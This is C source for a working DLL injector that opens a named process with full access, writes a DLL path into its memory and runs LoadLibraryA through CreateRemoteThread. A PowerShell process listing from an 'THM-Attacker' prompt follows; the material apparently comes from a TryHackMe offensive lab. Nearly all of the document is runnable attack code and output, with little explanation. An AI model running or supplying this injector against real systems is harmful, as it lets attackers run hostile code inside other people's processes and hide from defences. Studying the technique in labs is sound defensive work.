```C
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

DWORD getProcessId(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot) {
        PROCESSENTRY32 entry;
        entry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &entry)) {
            do {
                if (!strcmp(entry.szExeFile, processName)) {
                    return entry.th32ProcessID;
                }
            } while (Process32Next(hSnapshot, &entry));
        }
    }
    else {
        return 0;
    }
}

int main(int argc, char *argv[]) {

    if (argc != 3) {
        printf("Cannot find require parameters\n");
        printf("Usage: dll-injector.exe <process name> <path to DLL>\n");
        exit(0);
    }

    char dllLibFullPath[256];

    LPCSTR processName = argv[1];
    LPCSTR dllLibName = argv[2];

    DWORD processId = getProcessId(processName);
    if (!processId) {
        exit(1);
    }

    if (!GetFullPathName(dllLibName, sizeof(dllLibFullPath), dllLibFullPath, NULL)) {
        exit(1);
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        exit(1);
    }

    LPVOID dllAllocatedMemory = VirtualAllocEx(hProcess, NULL, strlen(dllLibFullPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (dllAllocatedMemory == NULL) {
        exit(1);
    }

    if (!WriteProcessMemory(hProcess, dllAllocatedMemory, dllLibFullPath, strlen(dllLibFullPath) + 1, NULL)) {
        exit(1);
    }

    LPVOID loadLibrary = (LPVOID) GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

    HANDLE remoteThreadHandler = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) loadLibrary, dllAllocatedMemory, 0, NULL);
    if (remoteThreadHandler == NULL) {
        exit(1);
    }

    CloseHandle(hProcess);

    return 0;
}
```
```PowerShell
PS C:\Users\THM-Attacker> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    140      10    13632      13632              2420   0 amazon-ssm-agent
    246      14     4036      17300       0.08   3476   3 backgroundTaskHost
    254      14     6000      20736       0.14      8   3 conhost
    151       9     6596      12932              2440   0 conhost
    286      12     2124       6108               452   3 csrss
    336      13     1924       5000               564   0 csrss
    161       9     1660       4700               636   1 csrss
    363      15     3556      15188       0.28   3976   3 ctfmon
    247      22     4684      13932       0.09   4748   3 dllhost
    541      22    16204      38376               792   1 dwm
    595      29    24452      61528              3196   3 dwm
   1571      58    25072      86256       5.45   1616   3 explorer
     49       6     1440       4228               908   0 fontdrvhost
     49       6     1636       4700               916   1 fontdrvhost
     49       6     1932       5836              3152   3 fontdrvhost
    196      11     1740       1256              4228   0 GoogleCrashHandler
    173       9     1832        376              4252   0 GoogleCrashHandler64
    236      14     2360       1332              3880   0 GoogleUpdate
      0       0       56          8                 0   0 Idle
     91       7     1168       5016              2060   0 LiteAgent
    460      25    11020      43220              2500   1 LogonUI
   1025      22     5192      14668               780   0 lsass
    222      13     2924      10228              4480   0 msdtc
    513      74   184824     129828               812   0 MsMpEng
    609      30    64016      73660       0.84    572   3 powershell
    316      13     2520      11260       0.16   3688   3 rdpclip
      0      13      516       9872                68   0 Registry
    248      13     2580      13280       0.22   1588   3 RuntimeBroker
    586      28     9420      31848       2.09   3672   3 RuntimeBroker
    235      12     3952      14352       0.05   3720   3 RuntimeBroker
   1160      76    90692     133736       5.55   3416   3 SearchUI
    310      11     3620       7788               768   0 services
    768      30    15708      52336       0.34   2980   3 ShellExperienceHost
    476      18     5048      24784       0.98   3708   3 sihost
    335      21     7320      21336       0.11   4900   3 smartscreen
     56       3      528       1228               412   0 smss
    481      23     5856      16920              2012   0 spoolsv
    155      11    15424      17636              2456   0 ssm-agent-worker
    849      27    30796      43804               628   0 svchost
   1846      99    43784      78172               640   0 svchost
    868      23     7196      24132               888   0 svchost
    622      31    10592      21880               904   0 svchost
    792      19     5096      11280               980   0 svchost
    608      20    16560      26728              1176   0 svchost
    604      31     8720      25324              1212   0 svchost
    693      38     8316      22664              1268   0 svchost
    313      11     2084       8812              1276   0 svchost
    368      16    11348      12780              1332   0 svchost
    404      32     8436      17360              1420   0 svchost
    221      10     1888       7412              1672   0 svchost
    202      11     1632       7128              1744   0 svchost
    203      10     2084       8100              2176   0 svchost
    130       7     1656       6368              3004   0 svchost
    184      10     4204      13176              3612   0 svchost
    455      19     6104      28864       0.22   3796   3 svchost
    293      16     4752      17788              2160   0 Sysmon
   1956       0      192        156                 4   0 System
    241      21     4036      13084       0.03   3820   3 taskhostw
    126       7     1280       6544              2416   0 unsecapp
    179      11     1596       6824               656   0 wininit
    250      12     2632      15700               704   1 winlogon
    291      12     2688      10172              3100   3 winlogon
    174       9     2116       8776               104   0 WmiPrvSE
```
